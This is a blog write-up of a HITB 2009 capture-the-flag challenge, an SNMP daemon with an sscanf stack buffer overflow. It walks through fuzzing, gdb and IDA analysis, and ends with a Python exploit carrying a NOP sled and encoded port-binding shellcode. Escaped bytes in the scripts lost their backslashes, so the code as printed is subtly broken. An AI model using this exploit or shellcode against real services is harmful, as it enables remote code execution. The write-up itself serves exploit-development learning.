---
title: 'HITB 2009 CTF Daemon6&#039;s Solution'
author: suto
layout: post

tweetcount:
  - 1
twittercomments:
  - 'a:1:{i:10715165007;s:7:"retweet";}'
shorturls:
  - 'a:4:{s:9:"permalink";s:61:"http://www.vnsecurity.net/2009/12/hitb-2009-daemon6-write-up/";s:7:"tinyurl";s:26:"http://tinyurl.com/ycgsfll";s:4:"isgd";s:18:"http://is.gd/aOueG";s:5:"bitly";s:0:"";}'
tweetbackscheck:
  - 1408358987
category:
  - 'CTF - CLGT Crew'
tags:
  - '2009'
  - 'CTF - CLGT Crew'
  - hackinthebox
  - hitb
---
This is the solution for daemon 06 of HITB 2009 CTF game. Note that I didn&#8217;t participate [CLGT team][1] at HITB 2009 CTF this year. I just played with the binaries after the conference to learn and practice myself.

For a short summary, daemon 06 is a SNMP Daemon listening on port 7272 with a basic buffer overflow bug in the SNMP packet handling function.

<pre>[snmpd v2.1] SNMP Daemon Started

Attempting to listen on port 7272..Ready</pre>

I started learning and reading some <a href="http://www.rane.com/note161.html" target="_blank">papers</a> about SNMP protocol. Basically, SNMP packet follow basic encoding rules. The most fundamental rule states that each field is encoded in three parts: Type, Length, and Data.

*   Type specifies the data type of the field using a single byte identifier.
*   Length specifies the length in bytes of the following Data section
*   Data is the actual value communicated.

Next, I build a packet with a very large content and send to this daemon to check out for trivial overflow bug.

Type: 0&#215;30 because it is a sequence of bytes  
Length: 0xff ( to make largest packet as i can )  
Data: I use a special string generate by Metasploit.

Here is script:

<pre class="brush: python; title: ; notranslate" title="">#!/usr/bin/python
from socket import *
import struct

host = "localhost"
port = 7272

shellcode="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4A"

payload = "x30xff"+shellcode
sock = socket(AF_INET,SOCK_DGRAM)
sock.sendto(payload,(host,port))
sock.close()
</pre>

After launching this script, I saw daemon6 got segfault.

<pre>Program received signal SIGSEGV, Segmentation fault.

[Switching to Thread 0xb7e726c0 (LWP 23375)]

0x62413862 in ?? ()

(gdb)</pre>

So I change this string &#8220;b8Ab&#8221; in script to AAAA to re-check. And:

<pre>Program received signal SIGSEGV, Segmentation fault.

[Switching to Thread 0xb7e726c0 (LWP 23385)]

0x41414141 in ?? ()</pre>

Now I can control execution flow of program and now is the time to find out what caused of this vuln. Launch IDA and search for all occurences of Recv

![recv][2]

Follow recvfrom function

<pre class="brush: cpp; title: ; notranslate" title="">.text:0804D610                 call    _recvfrom
.text:0804D615                 add     esp, 20h
.text:0804D618                 test    eax, eax
.text:0804D61A                 js      recvfromerror
.text:0804D620
.text:0804D620 loc_804D620:                            ; CODE XREF: .text:0804D870j
.text:0804D620                 push    ecx
.text:0804D621                 push    0FCh
.text:0804D626                 push    0
.text:0804D628                 push    ebx
.text:0804D629                 call    _memset
.text:0804D62E                 pop     eax
.text:0804D62F                 pop     edx
.text:0804D630                 push    ebx
.text:0804D631                 lea     eax, [ebp-0CB0h]
.text:0804D637                 push    eax
.text:0804D638                 call    sub_804CC90
</pre>

Now I use GDB to check if function at 0x0804cc90 is vulnerable.

<pre class="brush: cpp; title: ; notranslate" title="">(gdb) b *0x0804D637
Breakpoint 1 at 0x804d637
(gdb) r
Starting program: /home/d6/daemon6
(no debugging symbols found)
(no debugging symbols found)
(no debugging symbols found)
[Thread debugging using libthread_db enabled]
(no debugging symbols found)
[snmpd v2.1] SNMP Daemon Started
Attempting to listen on port 7272..Ready
[New Thread 0xb7dd26c0 (LWP 13501)]
[New Thread 0xb7d63b90 (LWP 13504)]
[Switching to Thread 0xb7dd26c0 (LWP 13501)]

Breakpoint 1, 0x0804d637 in ?? ()
(gdb) x/4i $eip
0x804d637 &lt;difftime@plt+17679&gt;:	push   %eax
0x804d638 &lt;difftime@plt+17680&gt;:	call   0x804cc90 &lt;difftime@plt+15208&gt;
0x804d63d &lt;difftime@plt+17685&gt;:	add    $0x10,%esp
0x804d640 &lt;difftime@plt+17688&gt;:	mov    0x805c1b0,%eax
(gdb) b *0x804d63d
Breakpoint 2 at 0x804d63d
(gdb) c
Continuing.
incorrect request

Program received signal SIGSEGV, Segmentation fault.
0x62413862 in ?? ()
</pre>

Check arguments of this function:

<pre class="brush: cpp; title: ; notranslate" title="">(gdb) x/2x $esp
0xbfb43980:    0xbfb43998    0xbfb44278
(gdb) x/x 0xbfb43998
0xbfb43998:    0x6141ff30
(gdb) x/s 0xbfb43998
0xbfb43998:     "0�Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5"...
(gdb)
</pre>

yes, this is my packet payload!

Here is the source of this function using Hexrays:

<pre class="brush: cpp; title: ; notranslate" title="">void *__cdecl sub_804CC90(const char *a1, int a2)
{
  int v3; // ST0C_4@6
  int v4; // ST10_4@6
  int v5; // ST14_4@6
  char s; // [sp+1Eh] [bp-1FEh]@1
  int v7; // [sp+20Ch] [bp-10h]@1
  char v8; // [sp+1E8h] [bp-34h]@1
  int v9; // [sp+118h] [bp-104h]@1
  int v10; // [sp+208h] [bp-14h]@1
  char src; // [sp+198h] [bp-84h]@5

  memset(&s, 0, 0xFAu);
  if ( sscanf(a1, "%d %s %s %s %d", &v7, &v8, &s, &v9, &v10) != 5 )
  {
    puts("incorrect request");
    return (void *)-1;
  }
  if ( v7 &lt; 0 || v7 &gt; 1 && v7 != 3 )
  {
    sub_804CBC0((int)&s, (int)&src);
LABEL_9:
    v5 = a2;
    v4 = (int)&v9;
    v3 = 2;
    goto LABEL_10;
  }
  if ( sub_804CBC0((int)&s, (int)&src) &lt; 0 )
    goto LABEL_9;
  v5 = a2;
  v4 = (int)&v9;
  v3 = 0;
LABEL_10:
  sub_804CB30(&v8, v7, v10, v3, v4, v5);
  return memcpy((void *)(a2 + 44), &src, 0x50u);
}
</pre>

sscanf seems to be a potential vulnerable. Lets try to break before and after this function to see different on stack :

Before:

<pre class="brush: cpp; title: ; notranslate" title="">(gdb) x/200x $esp
0xbfc352b0:	0xbfc35508	0x0805a300	0xbfc354d8	0xbfc354b4
0xbfc352c0:	0xbfc352ea	0xbfc353e4	0xbfc354d4	0xb7f27e78
0xbfc352d0:	0x00000001	0xb7f70fc4	0xb7f3f1b8	0x7972d654
0xbfc352e0:	0xbfc353b4	0xb7f5d999	0x000053a4	0x00000000
0xbfc352f0:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfc35300:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfc35310:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfc35320:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfc35330:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfc35340:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfc35350:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfc35360:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfc35370:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfc35380:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfc35390:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfc353a0:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfc353b0:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfc353c0:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfc353d0:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfc353e0:	0x00000000	0xb7f3bff4	0xb7d75b90	0xb7d754d0
0xbfc353f0:	0xbfc35458	0xb7f681e0	0xbfc35474	0xbfc35468
0xbfc35400:	0xb7d754d0	0xb7d75b90	0xbfc354b0	0xb7f71658
0xbfc35410:	0x080488cc	0xb7d754d0	0x00000000	0x00000000
0xbfc35420:	0xb7d75bd8	0xbfc3543c	0xb7d75bd8	0x00000001
0xbfc35430:	0xb7ded684	0xb7f37380	0xb7d75b90	0x00000006
0xbfc35440:	0xbfc354b8	0x00000001	0x00000081	0xb7f337d6
0xbfc35450:	0x00000000	0xb7d754b4	0xb7f3bff4	0xb7f2d4b6
0xbfc35460:	0x003d0f00	0xb7f2d080	0xb7f283d8	0xb7f3f000
0xbfc35470:	0xffffffff	0xffffffff	0xb7f70fc4	0xb7f71658
0xbfc35480:	0x08048620	0xbfc354c0	0xb7f62616	0xb7f71810
0xbfc35490:	0xb7f3f5b0	0x00000001	0x00000005	0x00000000
0xbfc354a0:	0x080488cc	0x00000000	0x0805c0dc	0x00000005
0xbfc354b0:	0xb7f283d8	0xbfc35de8	0xbfc35cd8	0xbfc35fe0
0xbfc354c0:	0xbfc361b8	0xb7f681e0	0xbfc361b8	0xbfc35de8
0xbfc354d0:	0xbfc361b8	0xb7f33e90	0xbfc35cd8	0xbfc35de8
0xbfc354e0:	0xbfc35cd8	0xbfc35fe0	0xbfc361b8	0x0804d63d
</pre>

And after the overflow, lets see the value of char v8; // \[sp+1E8h\] \[bp-34h\]@1 is :

<pre class="brush: cpp; title: ; notranslate" title="">(gdb) x/20x $ebp-0x34
0xbfc354b4:	0x306141ff	0x41316141	0x61413261	0x34614133
0xbfc354c4:	0x41356141	0x61413661	0x38614137	0x41396141
0xbfc354d4:	0x62413062	0x32624131	0x41336241	0x62413462
0xbfc354e4:	0x36624135	0x41376241	0x62413862	0x30634139
0xbfc354f4:	0x41316341	0x63413263	0x34634133	0x41356341
</pre>

/xff+&#8221;Aa0Aa1Aa&#8230;. -> is our string. So we can see sscanf() causes buffer overflow. We will stepi after sscanf and see:

<pre class="brush: cpp; title: ; notranslate" title="">(gdb) x/4i $eip
0x804cce9 &lt;difftime@plt+15297&gt;:	mov    $0xffffffff,%eax
0x804ccee &lt;difftime@plt+15302&gt;:	lea    -0xc(%ebp),%esp
0x804ccf1 &lt;difftime@plt+15305&gt;:	pop    %ebx
0x804ccf2 &lt;difftime@plt+15306&gt;:	pop    %esi
(gdb) stepi
0x0804ccee in ?? ()
(gdb) stepi
0x0804ccf1 in ?? ()
(gdb) x/4x $esp
0xbfdb7fbc:	0x41336241	0x62413462	0x36624135	0x41376241
(gdb) x/i $eip
0x804ccf1 &lt;difftime@plt+15305&gt;:	pop    %ebx
(gdb) stepi
0x0804ccf2 in ?? ()
(gdb) x/4i $eip
0x804ccf2 &lt;difftime@plt+15306&gt;:	pop    %esi
0x804ccf3 &lt;difftime@plt+15307&gt;:	pop    %edi
0x804ccf4 &lt;difftime@plt+15308&gt;:	pop    %ebp
0x804ccf5 &lt;difftime@plt+15309&gt;:	ret
(gdb) stepi
0x0804ccf3 in ?? ()
(gdb) stepi
0x0804ccf4 in ?? ()
(gdb) stepi
&lt;p&gt;Breakpoint 7, 0x0804ccf5 in ?? ()
(gdb) x/4x $esp
0xbfdb7fcc:	0x62413862	0x30634139	0x41316341	0x63413263
(gdb) x/i $eip
0x804ccf5 &lt;difftime@plt+15309&gt;:	ret
(gdb)
</pre>

Now it will return on 0&#215;62413862. It&#8217;s a basic buffer overflow!

And here is my exploit code (shellcode is a port-binding shellcode on port 4444):

<pre class="brush: python; title: ; notranslate" title="">#!/usr/bin/python
from socket import *
import struct

host = "localhost"
port = 7272
shellcode ="AAAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Abxe0xe6xffxbf"+"x90"*900+"xb8xb6x0ax95x0exd9xf7xd9x74x24xf4x31xc9x5dxb1x14x83xedxfcx31x45x10x03x45x10x54xffxa4xd5x6fxe3x94xaaxdcx8ex18xa4x03xfex7bx7bx43xa4xddxd1x2bxa4xe0xc4xf7x30xf5xb7x57x4cx14x5dx31x16x1ax22x34xe7xa0x90x42x58xcex1bxcaxdbxbfxc2x07x5bx2cx53xfdx63x0bxa9x81xd5xd2xc9xe9xcax0bx59x81x7cx7bxffx38x13x0ax1cxeaxb8x85x02xbax34x5bx44"
payload = "x30xff"+shellcode
sock = socket(AF_INET,SOCK_DGRAM)
sock.sendto(payload,(host,port))
sock.close()
</pre>

And result :

![exploit][3]

### References:

*   <a href="http://www.rane.com/note161.html" target="_blank">http://www.rane.com/note161.html</a>
*   <a href="http://www3.rad.com/networks/applications/snmp/main.htm" target="_blank">http://www3.rad.com/networks/applications/snmp/main.htm</a>

 [1]: /about-us/clgt-ctf-team/
 [2]: http://img40.imageshack.us/img40/7356/screenshot6uh.png
 [3]: http://img215.imageshack.us/img215/3538/screenshot5wz.png